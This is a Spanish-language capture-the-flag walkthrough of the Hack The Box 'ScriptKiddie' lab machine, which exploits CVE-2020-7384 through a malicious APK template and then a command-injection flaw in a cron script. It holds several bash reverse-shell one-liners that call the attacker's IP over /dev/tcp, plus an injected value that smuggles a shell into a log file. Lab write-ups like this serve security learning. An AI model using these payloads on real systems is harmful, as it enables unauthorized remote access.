# SCRIPTKIDDIE MACHINE

**Autor: Christian Jimenez**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/1.png)

## INDEX

- [[#ESCANEO Y ENUMERACION|ESCANEO Y ENUMERACION]]
- [[#EXPLOTACION|EXPLOTACION]]
- [[#ESCALA DE PRIVILEGIOS|ESCALA DE PRIVILEGIOS]]


## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```
nmap -p- --open -T5 - v -n 10.10.10.226 -oG allPorts
```

La salida nos muesta el puerto 22 y 500 abiertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/aux1.PNG)

Vamos a realizar una enumeracion de los servicios en los puertos:

```
nmap -p22,5000 -sV -sC 10.10.10.226 -oN targeted
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/aux2.PNG)

Vemos una pagina web en el puerto 5000 y el puerto ssh abierto (para conexiones posteriores me imagino)

Vamos a ver que hay en la pagina web:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/2.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/3.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/4.png)

Vemos que la pagina ofrece 3 herramientas online:

1. escaneo de puertos con nmap a travez de una IP dada.
2. busqueda de exploit mediante searchsploit.
3. generacion de un payload para windows, linux y android. En donde se puede subir un template. 

En elste caso nos vamos a aprovechar del tercer punto ya que si puede cargar un template en .exe para windows, .elf para linux y .apk para android.

## EXPLOTACION

Buscando en searchsploit template con esas extenciones encontre uno para android:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/5.png)

Nos lo copiamos a nuestro directorio y vemos que es lo que hace:

```
searchsploit -m multiple/local/49491.py

nano 49491.py

```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/6.png)

Vemos que esta registrado como el CVE 2020-7384, leyendo el codigo se puede entender que te genera un .apk malicioso y que en la variable payload se inyecta el comando que quieres ajacutar remotamente.

entonces en el campo payload vamos a mandar una reverse shell a nuestro equipo, actualizamos en valor de payload:

* IP de nuestro equipo: 10.10.14.235
* puerto al que estaremos a la escucha: 4455

```
payload = "/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.235/4455 0>&1\""
```

como estamos haciendo uso de comillas dobles dentro de unas comillas dobles tenemos dos opciones para que lo interprete bien, o cambiamos por comillas simples o las escapamos, es decir agregar un '\' antes de cada comilla. Asi indicamos que es una comilla.

guardamos los cambios y ahora instalamos el jarsigner que es necesario para el script y yo nolo tenia instalado:

```
sudo apt install openjdk-11-jdk
sudo update-alternatives --config java
(escogemos la version instalada en este caso 11 en modo maual)
```

ya con eso instalado podemos ejecutar el script en python:

```
python3 49491.py
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/7.png)

No escró la apk maliciosa en la siguiente ruta: **/tmp/tmpuyfkn0bt/evil.apk**

Vamos a copiarlo en nuestra ruta actual:

```
cp /tmp/tmpuyfkn0bt/evil.apk .
```

ahora lo vamos a cargar en la pagina de la maquina: http://10.10.10.226:500/

Y al mismo tiempo nos ponemos a la escucha con netcat en el puerto 4455:

```
nc -lvnp 4455
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/8.png)

en el campo de lhost puede ir cualquier direccion IP vsalida por la pagina y damos en generate y en netcat obtendremos acceso a la maquina como el usuario kid:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/9.png)

nos dirigimos a su /home/kid y vemos la primera flag:

```
cd /home/kid
ls
cat user.txt
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/10.png)

## ESCALA DE PRIVILEGIOS

Para la escalada de priviegios tenemos que ir viendo todos los directorios posibles y los permisos de los archivos, porque con sudo -l no se encontro nada. Viendo el /etc/passwd vemos que hay un usuario mas llamado **pwn**

dentro del directorio /home/kid esta la flag pero vemos que hay acceso a directorio /home/pwn:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/11.png)

Vemos un archivo llamado **scanlosers.sh** que podemos visualizar:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/12.png)

Vemos que carga el contenido de /home/kid/logs/hackers le aplica un filtro y ejecuta un comando.

**filtro:**

```
cat $log | cut -d' ' -f3- | sort -u

# si aplicamos esto a cualquier cadena sabremos que hace

echo "hola a todos como estan" | cut -d' ' -f3- | sort -u

#output: todos como estan
```

Vemos que toma todo desde el tercer valor

**comando:**

```
sh -c nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null
```

Como el propietario de ese archivo es pwn, podemos concatenarle un comando que sea nuestra revershe shell y realizariamos un pivoting e kid a pwn.

Ademas podemos ver si se esta ejecutando alguna tarea cron en el sistema, nos creamos un archivo .sh para ver los cron jobs:

```
#!/bin/bash 

old_process = $(ps -eo command) 

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E 'procmon|command|kworker|irq'
 	old_process=$new_process
done

```

lo llevamos a la ruta /home/kid, le damos permisos de ejecucion y lo ejecutamos:

```
chmod +x proc.sh
./proc.sh
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/13.png)

Vemos que se esta ejecutando el mismo comando del archivo **scanlosers.sh**:

```
sh -c nmap --top-ports 10 -oN recon/;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.66/4242 0>&1' #.nmap ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.66/4242 0>&1' # 2>&1 >/dev/null
```

entonces es una tarea que se ejecuta cada cierto periodo de tiempo. Claro que la relacion con el script:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/12.png)

la variable ${ip} valdria:

```
;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.66/4242 0>&1' #
```

Y recordemos que el archivo **scanlosers.sh** saca el valor de ${ip} del archivo **/home/kid/logs/hackers** del cual tenemos permisos de escritura-

Entonces tenemos que escribir en el archivo **/home/kid/logs/hackers** esto:

```
127.0.0.1 ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.235/4242 0>&1' #

donde 127.0.0.1 es la direccion IP auxiliar para que ahi se ejecute el nmap
donde 10.10.14.235 es nuestra direccion IP
y 4242 el puerto al que estaremos a escucha
```

Acerca del comando:

* el punto y coma (;) permite ejecutar otro comando al mismo tiempo y solo si el anterior comando esta bien:

```
cat test.txt ; id
```

* el # del final, recordemos que en bash el '#' sirve para comentar una linea y en el comando donde vamos inyectar, despues del ${ip} se tiene la siguiente instruccion:

```
2>&1 >/dev/null
```

En bash se tiene las siguientes salidas:

* 0: stdin que es la entrada estandar de un comando
* 1: stdout que es la salida estandar al colocar un comando
* 2: stderr que es la salida de error al colocar un comando

con el caracter '>' podemos redirigir la salida de un comando a algun lugar:

```
ls -la > salida.txt
```

Podemos redirigir las salidas a otro lado:

```
2>/dev/null
```

Aqui regirigimos los errores al /dev/null que es como una papelera en linux, como resultado al ejecutar un comando y si tuviera errores no se mostraran.

Puedes redigir el stderr (2) al stdout (1) mediante la siguiente sintaxis:

```
2>&1
```

Esto serviria para tener dentro de la salida estandar los errores tambien y todo esto dentro de un archivo para tener logs por ejemplo:

```
... 2>&1 > logs.txt
```

Ahora dicho esto en el comando del archivo **scanlosers.sh** que es este:

```
sh -c nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null
```

se tiene al final esto:

```
${ip} 2>&1 >/dev/null
```

Si IP fuera nuestra reverse shell, se envía el stderr al stdout y todo eso al /dev/null de forma que la reverse shell nunca se ejecutaria. Por eso se agrega un # al final para comentar esa parte del comando.

Entonces vamos a escribir la reverse shell en el archivo hackers y nos colocamos antes a la escucha en el puerto 4242:

```
echo "argumento1 argumento2 127.0.0.1 ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.235/4242 0>&1' #" >> hackers
```

de modo que el comando quedaria asi:

```
sh -c nmap --top-ports 10 -oN recon/127.0.0.1 ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.66/4242 0>&1' #.nmap 127.0.0.1 ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.66/4242 0>&1' # 2>&1 >/dev/null
```

guardamos y tenemos una reverse shell como pwn:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/14.png)

si hacemos un sudo -l vemos que podemos ejecutar msfconsole como sudo:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/15.png)

ejecutamos:

```
sudo /opt/metasploit-framework-6.0.9/msfconsole
```

y recordemos que dentro de metasploit podemos ejecutar los comandos de metasploit y tambien comandos del sistema operativo:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/16.png)

Ya podemos leer la flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SCRIPTKIDDIE/images/17.png)
